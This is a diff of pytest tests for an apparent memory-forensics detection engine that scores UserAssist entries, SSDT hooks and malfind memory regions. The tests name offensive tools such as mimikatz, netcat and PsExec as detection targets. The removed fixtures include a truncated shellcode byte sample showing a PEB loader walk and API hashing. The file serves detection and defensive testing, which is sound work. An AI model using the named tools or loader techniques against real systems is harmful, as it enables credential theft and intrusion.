-def test_userassist_script_in_risky_location_surfaces(eng):
-    score, why = eng._score_userassist_name(r"C:\\Users\\alice\\Downloads\\stage.ps1")
-    assert score >= eng._threshold("userassist")
-    assert "Script path" in why
+@pytest.mark.parametrize("name", [
+    "D:\\Packed\\pafish64.exe", "C:\\Users\\a\\Downloads\\mimikatz.exe",
+    "D:\\tools\\nc.exe", "C:\\Temp\\PsExec64.exe", "D:\\seatbelt.exe",
+])
+def test_userassist_names_a_known_tool_as_one(name):
+    """The tool is called out by name, not merely as a file in an odd place."""
+    assert "Known offensive tool name" in _ua_why(name)
+
+
+@pytest.mark.parametrize("name", [
+    "D:\\Packed\\setup.exe", "C:\\Users\\a\\Downloads\\concat.exe",
+    "D:\\incenter.exe",
+])
+def test_an_ordinary_name_is_not_read_as_a_tool(name):
+    """Matched on the basename stem, so "nc" inside "concat" is not netcat."""
+    assert "Known offensive tool name" not in _ua_why(name)
 
 
 # --------------------------------------------------------------------------
 # SSDT integrity (deep-only)
 # --------------------------------------------------------------------------
 
+def _ssdt(module: str, symbol: str = "NtOpenProcess", address: int = 0xFFFFF80000001000) -> dict:
+    return {"ssdt": [{"Address": address, "Index": 1, "Module": module, "Symbol": symbol}]}
+
+
 @pytest.mark.parametrize("module", [
     "ntoskrnl", "ntoskrnl.exe", "win32k.sys", "win32kbase.sys", "win32kfull.sys",
 ])
-def test_expected_windows_ssdt_target_is_not_a_finding(eng, module):
-    score, flag, _ = eng._score_ssdt_entry(
-        {"Address": 0xFFFFF80000001000, "Index": 1, "Module": module,
-         "Symbol": "NtOpenProcess"})
-    assert (score, flag) == (0, "")
+def test_expected_windows_ssdt_target_is_not_a_finding(module):
+    assert _objects(_score(_ssdt(module)), "kernel") == []
 
 
-def test_foreign_ssdt_target_surfaces(eng):
-    score, flag, why = eng._score_ssdt_entry(
-        {"Address": 0xFFFFF80100001000, "Index": 1, "Module": "thirdparty.sys",
-         "Symbol": "NtOpenProcess"})
-    assert score >= eng._threshold("ssdt")
-    assert flag == "SSDT_FOREIGN_MODULE"
-    assert "thirdparty.sys" in why
+def test_foreign_ssdt_target_surfaces():
+    out = _score(_ssdt("thirdparty.sys"))
+    objs = _objects(out, "kernel")
+    assert objs and objs[0]["contributions"][0]["rule_id"] == "ssdt_foreign_module"
+    assert "thirdparty.sys" in objs[0]["contributions"][0]["evidence"]
 
 
-def test_unresolved_ssdt_target_is_unknown_not_a_hook(eng):
-    assert eng._score_ssdt_entry({"Module": "N/A", "Symbol": "", "Address": None})[0] == 0
+def test_unresolved_ssdt_target_is_unknown_not_a_hook():
+    assert _objects(_score({"ssdt": [{"Module": "N/A", "Symbol": "", "Address": None}]}),
+                    "kernel") == []
+
+
+def test_an_ssdt_finding_records_the_module_it_resolved_to():
+    """Step 5 groups by target module, so it must not parse it out of the prose."""
+    objs = _objects(_score(_ssdt("thirdparty.sys")), "kernel")
+    assert objs[0]["contributions"][0]["subject"] == "thirdparty.sys"
 
 
 def test_ssdt_is_only_scheduled_for_deep_kernel_analysis(eng):
@@ -532,82 +635,29 @@ def test_the_host_environment_cannot_change_the_verdict(monkeypatch):
 
 
 # --------------------------------------------------------------------------
-# malfind, against the nine regions a real Windows 10 image produced
+# the region a malfind finding came from
 #
-# All nine are PAGE_EXECUTE_READWRITE and private, so the region's attributes
-# alone cannot separate them -- every one scores identically on protection. What
-# separates them is what the bytes do.
+# The engine scores a process, not each of its regions, but step 2 reports one
+# row per region -- so a contribution has to say which region it read, or the
+# step has to re-derive it and becomes a second scorer.
 # --------------------------------------------------------------------------
 
-RWX = {"Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1, "CommitCharge": 1}
-
-# PID 2580, malware.exe: push ebp / mov ebp,esp / pusha, push fs + pop ds, the
-# PEB->Ldr walk (8b 40 0c, 8b 70 1c, 8b 46 08, 8b 7e 20), then a pushed API hash.
-SHELLCODE = bytes.fromhex(
-    "558bec81c4e8feffff6083ec04832424001e0fa01f33c040d1e040c1e0048b001f"
-    "8b400c8b701c33c98b46088b7e208b3666394f1875f268b2f2e2f46832749100")
-
-# PID 5292, SearchHost.exe: mov rax,imm64 / jmp rax trampolines with cc padding.
-JIT_TRAMPOLINE = bytes.fromhex(
-    "48b80000001 09a01000048ffe0cccccc48b80010001 09a01000048ffe0cccccc"
-    .replace(" ", "") + "48b80078011 09a01000048ffe0cccccc48b80030001 09a01000048ffe0cccccc"
-    .replace(" ", ""))
-
-# PID 5292, SearchHost.exe: an ordinary x64 prologue spilling its arguments.
-JIT_METHOD = bytes.fromhex(
-    "4889542410 48894c2408 4c89442418 4c894c2420 488b4128 488b4808 488b5150"
-    .replace(" ", "") + "4883e2f8 488bca 48b86000787da2010000 482bc8 4881f9700f0000 7609 48c7c1"
-    .replace(" ", ""))
-
-# PID 5292, SearchHost.exe: relative jump thunks separated by cc padding.
-JIT_THUNKS = bytes.fromhex(
-    "e9fbff3a000000000 0cccccccccccccc".replace(" ", "") * 2)
-
-# PID 3768, powershell.exe: a table of heap pointers, not code at all.
-POINTER_TABLE = bytes.fromhex(
-    "000000000000000010773a28690200001 0773a2869020000".replace(" ", "") +
-    "00003a2869020000b00dd02969020000".ljust(32, "0"))
+def test_a_malfind_contribution_records_the_region_it_read():
+    out = _score(_malfind(_region(b"MZ\x90\x00" + b"\x41" * 60, **{"Start VPN": 0x7ffd000})))
+    proc = _objects(out, "process")[0]
+    assert {c["subject"] for c in proc["contributions"]} == {str(0x7ffd000)}
 
 
-def _region(data: bytes, **over):
-    row = dict(RWX, Hexdump=hexdump(data))
-    row.update(over)
-    return row
+def test_every_region_of_a_process_is_recorded_even_when_outscored():
+    """Six RWX regions in one process are six observations and one score.
 
-
-def test_the_shellcode_region_surfaces(eng):
-    score, flags, _ = eng._score_injections(_region(SHELLCODE, CommitCharge=2))
-    assert score >= eng._threshold("malfind")
-    assert eng._risk_from_score(score) in {"High", "Critical"}
-    assert "LDRWALK" in flags
-    assert "SEG" not in flags  # weaker evidence from the same loader-behavior family
-
-
-@pytest.mark.parametrize("data,label", [
-    (JIT_TRAMPOLINE, "mov rax,imm64 / jmp rax trampolines"),
-    (JIT_METHOD, "an ordinary x64 prologue"),
-    (JIT_THUNKS, "relative jump thunks"),
-    (POINTER_TABLE, "a table of heap pointers"),
-])
-def test_ordinary_private_executable_regions_do_not_surface(eng, data, label):
-    """A JIT engine produces these by the dozen in every browser and .NET host."""
-    score, _, _ = eng._score_injections(_region(data))
-    assert score < eng._threshold("malfind"), f"{label} scored {score}"
-
-
-def test_the_protection_flags_alone_never_reach_the_threshold(eng):
-    """Otherwise every malfind row surfaces, since malfind only reports these."""
-    score, _, _ = eng._score_injections(_region(b"\x33\xc0" + b"\x90" * 4 + b"\x11" * 58))
-    assert score < eng._threshold("malfind")
-
-
-def test_a_peb_walk_needs_more_than_one_field_access(eng):
-    """Compiled code reaches structure fields the same way; one is meaningless."""
-    assert eng._peb_walk(bytes.fromhex("8b400c") + b"\x00" * 32) is False
-    assert eng._peb_walk(bytes.fromhex("8b400c") + bytes.fromhex("8b701c")) is True
-
-
-def test_small_pushed_constants_are_not_read_as_hashes(eng):
-    """push 0x10, push 0x100 -- lengths and flags, mostly zero bytes."""
-    assert eng._api_hashing(bytes.fromhex("6810000000") * 3) == 0
-    assert eng._api_hashing(bytes.fromhex("68b2f2e2f4")) == 1
+    Family dedup decides what counts toward the score, not what was seen. If the
+    superseded ones were dropped, step 2 would show one region and silently hide
+    the other five -- which is what the reference image's SearchHost.exe does.
+    """
+    starts = [0x1000, 0x2000, 0x3000, 0x4000, 0x5000, 0x6000]
+    rows = [_region(b"\x33\xc0" + b"\x11" * 62, **{"Start VPN": s}) for s in starts]
+    proc = _objects(_score(_malfind(*rows)), "process")[0]
+    rwx = [c for c in proc["contributions"] if c["rule_id"] == "malfind_rwx_private"]
+    assert {c["subject"] for c in rwx} == {str(s) for s in starts}
+    assert len([c for c in rwx if not c["superseded"]]) == 1
